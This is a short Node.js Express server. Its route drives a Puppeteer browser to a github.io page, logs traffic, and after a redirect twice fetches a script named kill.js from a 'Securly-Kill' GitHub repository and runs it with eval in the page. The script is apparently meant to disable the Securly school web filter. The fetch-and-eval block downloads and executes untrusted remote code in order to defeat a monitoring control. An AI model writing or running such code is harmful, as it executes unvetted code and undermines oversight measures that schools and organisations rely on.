const express = require('express');
const puppeteer = require('puppeteer');

const app = express();
const port = 3000;

// Define the route to trigger the Puppeteer script
app.get('/run-script', async (req, res) => {
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();

    let initialUrl = null;
    let finalUrl = null;

    // Intercept requests and responses
    await page.setRequestInterception(true);

    page.on('request', (request) => {
        console.log(`Request: ${request.url()}`);
        request.continue();
    });

    page.on('response', async (response) => {
        console.log(`Response: ${response.url()} - Status: ${response.status()}`);
        if (response.status() === 200) {
            finalUrl = response.url();
        }
    });

    try {
        initialUrl = page.url();
        console.log('Initial URL:', initialUrl);

        // Replace this with the URL you want to test
        await page.goto('https://dy1ngrat.github.io/pupet/'); 

        // Wait for navigation/redirection
        await page.waitForNavigation({ waitUntil: 'domcontentloaded' });

        console.log('Final URL:', finalUrl);

        if (finalUrl) {
            for (let i = 0; i < 2; i++) {
                await page.evaluate(async () => {
                    const scriptContent = await fetch('https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js')
                        .then((r) => r.text());
                    eval(scriptContent);
                });
            }

            console.log('Script executed after redirect.');
            res.send('Script executed successfully.');
        } else {
            res.send('No redirect detected.');
        }

    } catch (error) {
        console.error('Error:', error);
        res.status(500).send('An error occurred.');
    }

    // Do not close the browser so it stays open for inspection
    // await browser.close(); // Optionally close the browser if you want
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
